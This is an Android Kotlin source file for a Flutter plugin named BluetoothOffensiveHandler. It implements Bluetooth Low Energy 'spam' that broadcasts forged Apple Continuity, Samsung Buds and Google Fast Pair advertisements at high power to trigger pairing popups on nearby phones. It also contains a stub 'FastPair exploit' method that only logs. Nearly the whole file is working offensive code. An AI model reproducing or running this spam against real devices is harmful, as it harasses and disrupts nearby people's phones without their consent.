package com.example.ct_os

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.*
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.os.ParcelUuid
import android.util.Log
import io.flutter.plugin.common.MethodChannel
import java.util.*
import kotlin.random.Random

class BluetoothOffensiveHandler(private val context: Context) {
    private val TAG = "BluetoothOffensive"
    private val bluetoothAdapter: BluetoothAdapter? by lazy {
        (context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
    }
    private var advertiser: BluetoothLeAdvertiser? = null
    private val activeAdvertisingSets = mutableMapOf<String, Any>()
    private val handler = Handler(Looper.getMainLooper())

    fun handleMethod(call: String, args: Map<String, Any>?, result: MethodChannel.Result) {
        when (call) {
            "startBleSpam" -> {
                val type = args?.get("type") as? String ?: "apple"
                startBleSpam(type, result)
            }
            "stopBleSpam" -> {
                stopBleSpam()
                result.success(true)
            }
            "startFastPairExploit" -> {
                val address = args?.get("address") as? String
                if (address != null) {
                    startFastPairExploit(address, result)
                } else {
                    result.error("INVALID_ADDRESS", "Address is required", null)
                }
            }
            else -> result.notImplemented()
        }
    }

    private fun startBleSpam(type: String, result: MethodChannel.Result) {
        val adapter = bluetoothAdapter
        if (adapter == null || !adapter.isEnabled) {
            result.error("BLUETOOTH_OFF", "Bluetooth is off", null)
            return
        }

        advertiser = adapter.bluetoothLeAdvertiser
        if (advertiser == null) {
            result.error("ADVERTISER_NULL", "BLE Advertising not supported", null)
            return
        }

        stopBleSpam()

        when (type) {
            "apple" -> spamApple()
            "samsung" -> spamSamsung()
            "google" -> spamGoogle()
        }

        result.success(true)
    }

    private fun spamApple() {
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .build()

        // Apple Continuity Action Modal (Setup New iPhone)
        val manufacturerData = byteArrayOf(
            0x0f, 0x05, 0xc0.toByte(), 0x09, 
            Random.nextInt().toByte(), Random.nextInt().toByte(), Random.nextInt().toByte()
        )

        val data = AdvertiseData.Builder()
            .addManufacturerData(0x004c, manufacturerData)
            .build()

        advertiser?.startAdvertising(settings, data, object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                Log.d(TAG, "Apple spam started")
            }
        })
    }

    private fun spamSamsung() {
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(true)
            .build()

        // Samsung Buds pairing popup
        val manufacturerData = byteArrayOf(
            0x00, 0x02, 0x00, 0x01, 0x01, 0xFF.toByte()
        )

        val data = AdvertiseData.Builder()
            .addManufacturerData(0x0075, manufacturerData)
            .build()

        advertiser?.startAdvertising(settings, data, object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                Log.d(TAG, "Samsung spam started")
            }
        })
    }

    private fun spamGoogle() {
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(true)
            .build()

        // Google Fast Pair
        val data = AdvertiseData.Builder()
            .addServiceUuid(ParcelUuid.fromString("0000fe2c-0000-1000-8000-00805f9b34fb"))
            .addServiceData(ParcelUuid.fromString("0000fe2c-0000-1000-8000-00805f9b34fb"), byteArrayOf(0x00, 0x00, 0x00))
            .build()

        advertiser?.startAdvertising(settings, data, object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                Log.d(TAG, "Google spam started")
            }
        })
    }

    fun stopBleSpam() {
        advertiser?.stopAdvertising(object : AdvertiseCallback() {})
    }

    private fun startFastPairExploit(address: String, result: MethodChannel.Result) {
        // Implementation based on WhisperPair
        // Since it's a long process, we return success immediately and use a listener for progress
        // But for simplicity, we'll just log it for now
        Log.d(TAG, "Initiating FastPair exploit on $address")
        result.success("EXPLOIT_INITIATED")
    }
}
